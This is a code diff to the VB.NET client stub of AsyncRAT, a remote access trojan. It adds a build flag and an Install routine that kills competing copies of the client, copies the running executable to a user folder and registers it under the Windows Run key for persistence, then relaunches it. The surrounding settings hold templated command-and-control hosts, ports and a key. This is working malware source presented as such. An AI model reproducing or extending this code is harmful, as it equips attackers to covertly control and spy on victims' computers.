@@ -19,6 +19,7 @@ Imports System.Security
 Imports System.Text
 
 #Const VS = True
+#Const INS = False
 
 #If Not VS Then
 <Assembly: AssemblyTitle("%Title%")>
@@ -48,6 +49,13 @@ Imports System.Text
 Namespace AsyncRAT_Stub
 
     Public Class Settings
+
+#If INS Then
+        Public Shared ReadOnly ClientFullPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.%DIR%), "%EXE%")
+#Else
+        Public Shared ReadOnly ClientFullPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Client.exe")
+#End If
+
 #If VS Then
         Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"127.0.0.1"})
         Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({6603, 6604, 6605, 6606})
@@ -56,7 +64,9 @@ Namespace AsyncRAT_Stub
         Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
         Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({%PORT%})
         Public Shared ReadOnly KEY As String = "%KEY%"
+
 #End If
+
         Public Shared ReadOnly VER As String = "v1.6"
         Public Shared ReadOnly SPL As String = "<<Async|RAT>>"
     End Class
@@ -78,7 +88,9 @@ Namespace AsyncRAT_Stub
 
             'Do Something Here..
 
-
+#If INS Then
+                        Install()
+#End If
 
 
             While True
@@ -91,6 +103,33 @@ Namespace AsyncRAT_Stub
             End While
 
         End Sub
+
+#If Not INS Then
+        Public Shared Sub Install()
+            Thread.Sleep(2 * 1000)
+            Try
+                If Process.GetCurrentProcess.MainModule.FileName <> Settings.ClientFullPath Then
+                    For Each P As Process In Process.GetProcesses
+                        Try
+                            If P.MainModule.FileName = Settings.ClientFullPath Then
+                                P.Kill()
+                            End If
+                        Catch : End Try
+                    Next
+                    Using Drop As New FileStream(Settings.ClientFullPath, FileMode.Create)
+                        Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
+                        Drop.Write(Client, 0, Client.Length)
+                    End Using
+                    Thread.Sleep(2 * 1000)
+                    Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(Settings.ClientFullPath), Settings.ClientFullPath)
+                    Process.Start(Settings.ClientFullPath)
+                    Environment.Exit(0)
+                End If
+            Catch ex As Exception
+                Debug.WriteLine("Install : Failed : " + ex.Message)
+            End Try
+        End Sub
+#End If
 
         Public Shared Sub Connect()
 
